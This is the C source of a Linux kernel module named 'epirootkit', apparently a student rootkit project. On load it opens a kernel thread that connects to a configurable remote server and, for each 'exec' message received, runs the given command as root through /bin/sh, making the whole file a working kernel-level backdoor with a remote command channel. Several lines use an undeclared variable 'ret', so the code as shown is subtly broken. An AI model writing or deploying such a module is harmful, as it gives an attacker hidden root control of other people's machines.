#include <linux/module.h>
#include <linux/net.h>
#include <linux/inet.h>
#include <linux/delay.h>
#include <linux/fs.h>
#include <linux/slab.h>
#include <linux/uaccess.h>
#include <linux/init.h>
#include <linux/string.h>
#include <linux/file.h>
#include <linux/kernel.h>
#include <linux/kmod.h>
#include <linux/kthread.h>
#include <linux/sched.h>

#define SUCCESS 0
#define FAILURE 1

#define MAX_SENDING_MSG_ATTEMPTS 10
#define TIMEOUT_BEFORE_RETRY 1000
#define RCV_CMD_BUFFER_SIZE 1024
#define STD_BUFFER_SIZE 4096

static struct socket *sock = NULL;
static struct task_struct *network_thread = NULL;
static bool thread_exited = false;

static char *ip = "127.0.0.1";
static int port = 4242;
static char *message = "Message from epirootkit: connexion established\n";

module_param(ip, charp, 0644);
module_param(port, int, 0644);
module_param(message, charp, 0644);

MODULE_PARM_DESC(ip, "Server IPv4");
MODULE_PARM_DESC(port, "Server port");
MODULE_PARM_DESC(message, "Message to send to the server");

static int close_communication(void){
	if (sock) {
		sock_release(sock);
		sock = NULL;
		pr_info("close_communication: socket released\n");
	}
	return SUCCESS;
}

static int close_thread(void){
	if (network_thread) {
		if (!thread_exited)
			kthread_stop(network_thread);
		pr_info("close_thread: thread stopped\n");
	}
	return SUCCESS;
}

static int cleanup(void){
	close_thread();
	close_communication();

	return SUCCESS;
}

static int exec_str_as_command(char *user_cmd){
	struct subprocess_info *sub_info = NULL;
	struct file *file = NULL;
	char *cmd = NULL;
	char *argv[] = { "/bin/sh", "-c", NULL, NULL };
	char *envp[] = { "PATH=/sbin:/bin:/usr/sbin:/usr/bin", NULL };
	char *output_file = "/tmp/kernel_exec_output";
	char *buf = NULL;
	loff_t pos = 0;
	int status = 0;
	int len = 0;

	cmd = kmalloc(RCV_CMD_BUFFER_SIZE, GFP_KERNEL);
	if (!cmd)
		return -ENOMEM;

	snprintf(cmd, RCV_CMD_BUFFER_SIZE, "%s > %s 2>&1", user_cmd, output_file);
	argv[2] = cmd;

	pr_info("exec_str_as_command: executing command: %s\n", cmd);

	// Set up the subprocess info structure
	sub_info = call_usermodehelper_setup(argv[0], argv, envp, GFP_KERNEL, NULL, NULL, NULL);
	if (!sub_info) {
		kfree(cmd);
		return -ENOMEM;
	}

	// execute the command
	status = call_usermodehelper_exec(sub_info, UMH_WAIT_PROC);
	pr_info("exec_str_as_command: command exited with status: %d\n", status);

	// Read the output from the file and print it
	file = filp_open(output_file, O_RDONLY, 0);
	if (IS_ERR(file)) {
		kfree(cmd);
		return -ENOENT;
	}

	buf = kmalloc(STD_BUFFER_SIZE, GFP_KERNEL);
	if (!buf) {
		filp_close(file, NULL);
		kfree(cmd);
		return -ENOMEM;
	}

	len = kernel_read(file, buf, STD_BUFFER_SIZE - 1, &pos);
	if (len >= 0) {
		buf[len] = '\0';
		pr_info("exec_str_as_command: command output:\n%s", buf);
	}

	// Clean up
	kfree(buf);
	filp_close(file, NULL);
	kfree(cmd);
	return SUCCESS;
}

static int network_worker(void *data){
	struct sockaddr_in addr = { 0 };
	struct msghdr msg = { 0 };
	struct kvec vec = { 0 };
	unsigned char ip_binary[4] = { 0 };
	int ret_code = 0;

	// Validate the IP address
	if (!in4_pton(ip, -1, ip_binary, -1, NULL)) {
		pr_err("network_worker: invalid IPv4\n");
		return FAILURE;
	}

	// Create a socket
	ret_code = sock_create(AF_INET, SOCK_STREAM, IPPROTO_TCP, &sock);
	if (ret_code < 0) {
		pr_err("network_worker: socket creation failed: %d\n", ret);
		return FAILURE;
	}

	// Set up the socket address structure
	addr.sin_family = AF_INET;
	addr.sin_port = htons(port);
	memcpy(&addr.sin_addr.s_addr, ip_binary, sizeof(addr.sin_addr.s_addr));

	// Connect to the server 
	// Retry until successful or thread is stopped
	while (!kthread_should_stop()) {
		ret_code = sock->ops->connect(sock, (struct sockaddr *)&addr, sizeof(addr), 0);
		if (ret_code < 0) {
			pr_err("network_worker: failed to connect to %s:%d (%d), retrying...\n", ip, port, ret);
			msleep(TIMEOUT_BEFORE_RETRY);
			continue;
		}
		break;
	}

	vec.iov_base = (void *)message;
	vec.iov_len = strlen(message);

	int attempts = 0;
	do {
		ret_code = kernel_sendmsg(sock, &msg, &vec, 1, vec.iov_len);
		if (ret_code < 0) {
			pr_err("network_worker: failed to send message: %d, retrying... (attempt %d/%d)\n", ret, attempts + 1, MAX_SENDING_MSG_ATTEMPTS);
			msleep(TIMEOUT_BEFORE_RETRY);
			attempts++;
		}
	} while (ret_code < 0 && attempts < MAX_SENDING_MSG_ATTEMPTS);

	// Case where connexion is set up but message failed to be sent
	// Usually when the module is unmonted before the message is sent
	if (ret_code < 0) {
		pr_err("network_worker: failed to send message after 10 attempts, giving up.\n");
		return FAILURE;
	}

	pr_info("network_worker: message sent to %s:%d\n", ip, port);

	// Listen for commands
	// Retry until 'killcom' is received or thread is stopped by unmonting the module
	while (!kthread_should_stop()) {
		struct kvec recv_vec;
		struct msghdr recv_msg = { 0 };
		char recv_buffer[RCV_CMD_BUFFER_SIZE] = { 0 };

		recv_vec.iov_base = recv_buffer;
		recv_vec.iov_len = sizeof(recv_buffer) - 1;

		// Wait for a message from the server
		ret_code = kernel_recvmsg(sock, &recv_msg, &recv_vec, 1, recv_vec.iov_len, 0);
		if (ret_code < 0) {
			pr_err("network_worker: error receiving message: %d\n", ret);
			msleep(TIMEOUT_BEFORE_RETRY);
			continue;
		}

		recv_buffer[ret] = '\0';
		pr_info("network_worker: received: %s", recv_buffer);

		// Three cases:
		// 1. exec <command> : execute the command
		// 2. killcom : close connection and exit
		// 3. any other message : ignore (has been printed above)
		if (strncmp(recv_buffer, "exec ", 5) == 0) {
			char *command = recv_buffer + 5;
			command[strcspn(command, "\n")] = '\0';
			pr_info("network_worker: executing command: %s\n", command);
			exec_str_as_command(command);
		} else if (strncmp(recv_buffer, "killcom", 7) == 0) {
			pr_info("network_worker: killcom received, exiting...\n");
			break;
		}
	}

	pr_info("network_worker: thread ends.\n");
	thread_exited = true;
	close_communication();

	return SUCCESS;
}

static int __init epirootkit_init(void){
	pr_info("epirootkit_init: module loaded\n");

	network_thread = kthread_run(network_worker, NULL, "netcom_thread");
	if (IS_ERR(network_thread)) {
		pr_err("epirootkit_init: failed to start thread\n");
		return PTR_ERR(network_thread);
	}

	return SUCCESS;
}

static void __exit epirootkit_exit(void){
	cleanup();
	pr_info("epirootkit_exit: module unloaded\n");
}


module_init(epirootkit_init);
module_exit(epirootkit_exit);

MODULE_LICENSE("GPL");
MODULE_AUTHOR("STDBOOL");
MODULE_DESCRIPTION("MTF Rootkit - EPI Rootkit");